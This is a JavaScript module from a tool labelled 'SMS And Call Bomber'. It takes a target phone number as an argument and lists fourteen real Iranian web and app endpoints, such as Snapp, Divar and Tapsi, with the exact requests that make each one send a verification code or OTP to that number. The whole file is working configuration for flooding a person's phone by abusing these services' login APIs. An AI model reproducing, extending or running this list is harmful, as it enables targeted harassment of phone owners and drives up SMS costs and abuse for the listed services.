//   promoxy 	: 	SMS And Call Bomber
//   Author 	: 	jxroot 
//   Version 	: 	1
//   Github 	: 	https://github.com/jxroot/promoxy
const number = process.argv[2]
list=[{
    
    "url":"https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
    "data":{cellphone: `+98${number}`}    ,
    "name":"snapp",
    "type":"WEB",
    "method":"POST"
},
{
    "url":"https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
    "data":{"UserName":`+98${number}`}    ,
    "name":"namava",
    "type":"APK",
    "method":"POST"
},    {
    "url":"https://allinco.ir/api/Users/signIn",
    "data":
    {"deviceId":"86eb30f27c0b58bb","hashCode":"Aq1/XpLps/v","mobile":`0${number}`}    ,
    "name":"allinco",
    "type":"APK",
    "method":"POST"
},

{
    "url":"https://api.komodaa.com/api/v2.6/loginRC/request",
    "data":{"phone_number":`0${number}`}  ,
    "name":"komodaa",
    "type":"APK",
    "method":"POST"
},  
{
    "url":"https://baarbaanet.com/Barbanet/rest/pub/user/otp/send",
    "data":{"mobile":`0${number}`,"viaSms":true,"viaEmail":false} ,
    "name":"baarbaanet",
    "type":"WEB",
    "method":"POST"
},  {
    "url":"https://bornosmode.com/api/loginRegister/",
    "data":{mobile: `0${number}`
        ,withOtp: 1} ,
    "name":"bornosmode",
    "type":"WEB",
    "method":"POST"
},  
{
    "url":"https://livito.tv/api/oauth/initialize",
    "data":{"grant_type":"password","channel":"PASSWORD","scope":"*","username":`0${number}`} ,
    "name":"livito",
    "type":"WEB",
    "method":"POST"
},  
{
    "url":"https://b2n.ir/lib/phone.php",
    "data":{"type":"1","phone":`0${number}`} ,
    "name":"b2n",
    "type":"WEB",
    "method":"POST"
}, 
{
    "url":"https://api.divar.ir/v5/auth/authenticate",
    "data": {"phone":`0${number}`},
    "name":"divar",
    "type":"WEB",
    "method":"POST"
},  
{
    "url":"https://api.zarinplus.com/user/zarinpal-login",
    "data": {"phone_number":`98${number}`},
    "name":"zarinplus",
    "type":"WEB",
    "method":"POST"
},  
{
    "url":"https://api.tapsi.cab/api/v2.2/user",
    "data": {"credential":{"phoneNumber":`0${number}`,"role":"PASSENGER"},"otpOption":"SMS"},
    "name":"tapsi",
    "type":"WEB",
    "method":"POST"
},  
{

    "url":`https://api.torob.com/a/phone/send-pin/?phone_number=0${number}`,
    "name":"torob",
    "type":"WEB",
    "method":"GET"
},   
{

    "url":`https://core.gap.im/v1/user/add.json?mobile=0${number}`,
    "name":"coregap",
    "type":"WEB",
    "method":"GET"
},   
{

    "url":`https://zancoiran.com:5050/Main/SiteBaseApi/GenerateMobileKey?mobileno=0${number}`,
    "name":"zancoiran",
    "type":"WEB",
    "method":"GET"
},    
]
module.exports = {
    api:list ,
    number: number,
};

